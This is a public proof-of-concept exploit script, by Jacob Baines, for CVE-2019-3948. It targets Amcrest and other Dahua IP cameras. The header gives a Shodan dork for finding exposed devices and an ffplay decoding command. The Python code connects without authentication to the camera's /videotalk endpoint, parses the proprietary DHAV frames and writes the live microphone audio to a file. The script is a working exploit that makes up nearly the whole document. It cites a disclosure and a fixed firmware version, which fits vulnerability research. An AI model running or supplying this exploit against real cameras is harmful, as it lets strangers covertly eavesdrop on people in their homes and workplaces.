##
# Exploit Title: Unauthenticated Audio Streaming from Amcrest Camera
# Shodan Dork: html:"@WebVersion@"
# Date: 08/29/2019
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Affected Version: V2.520.AC00.18.R
# Fixed Version: V2.420.AC00.18.R
# Tested on: Tested on Amcrest IP2M-841 but known to affect other Dahua devices.
# CVE : CVE-2019-3948
# Disclosure: https://www.tenable.com/security/research/tra-2019-36
# Disclosure: https://sup-files.s3.us-east-2.amazonaws.com/Firmware/IP2M-841/JS+IP2M-841/Changelog/841_721_HX1_changelog_20190729.txt
#
# To decode the scripts output using ffplay use:
# 	ffplay -f alaw -ar 8k -ac 1 [poc output]
# Note that this assumes the camera is using the default encoding options.
##
import argparse
import socket
import struct
import sys

##
# Read in the specified amount of data. Continuing looping until we get it all...
# what could go wrong?
#
# @return the data we read in
##
def recv_all(sock, amount):
	data = ''
	while len(data) != amount:
		temp_data = sock.recv(amount - len(data))
		data = data + temp_data

	return data

top_parser = argparse.ArgumentParser(description='Download audio from the HTTP videotalk endpoint')
top_parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="The IPv4 address to connect to")
top_parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="The port to connect to", default="80")
top_parser.add_argument('-o', '--output', action="store", dest="output", help="The file to write the audio to")
top_parser.add_argument('-b', '--bytes', action="store", dest="bytes", type=int, help="The amount of audio to download", default="1048576")
args = top_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setblocking(True)

print "[+] Attempting connection to " + args.ip + ":" + str(args.port)
sock.connect((args.ip, args.port))
print "[+] Connected!"

request = ('GET /videotalk HTTP/1.1\r\n' +
	       'Host: ' + args.ip + ':' + str(args.port) + '\r\n' +
	       'Range: bytes=0-\r\n' +
	       '\r\n')
sock.sendall(request)

status = ''
header = ''

# read in the HTTP response. Store the status.
while (header != '\r\n'):
	header = header + sock.recv(1);
	if (header.find('\r\n') > 0):
		header = header.strip()
		if (len(status) == 0):
			status = header
		header = ''

if (status.find('200 OK') == -1):
	print '[-] Bad HTTP status. We received: "' + status + '"'
	sock.close()
	exit()
else:
	print '[+] Downloading ' + str(args.bytes) + ' bytes of audio ...'

total_audio = ''
while (len(total_audio) < args.bytes):

	# read in the header length
	header_length = recv_all(sock, 4)
	hlength = struct.unpack("I", header_length)[0]
	if (hlength != 36):
		print '[-] Unexpected header length'
		sock.close()
		exit()

	# read in the header and extract the payload length
	header = recv_all(sock, hlength)
	plength = struct.unpack_from(">H", header)[0]
	if (plength != 368):
		print '[-] Unexpected payload length'
		sock.close()
		exit()

	# there is a seq no in the header but since this is over
	# tcp is sort of useless.

	dhav = header[2:6]
	if (dhav != "DHAV"):
		print '[-] Invalid header'
		exit(0)

	# extract the audio. I'm really not sure what the first 6 bytes are
	# but the last 8 serve as a type of trailer
	whatami = recv_all(sock, 6)
	audio = recv_all(sock, plength - hlength - 12)
	trailer = recv_all(sock, 8)

	if (trailer != 'dhavp\x01\x00\x00'):
		print '[-] Invalid end of frame'
		sock.close()
		exit()

	total_audio = total_audio + audio
	sys.stdout.write('\r'+ str(len(total_audio)) + " / " + str(args.bytes))
	sys.stdout.flush()

print ''
print '[+] Finished receiving audio.'
print '[+] Closing socket'

out_file = open(args.output, 'wb')
out_file.write(total_audio)
out_file.close()

sock.close()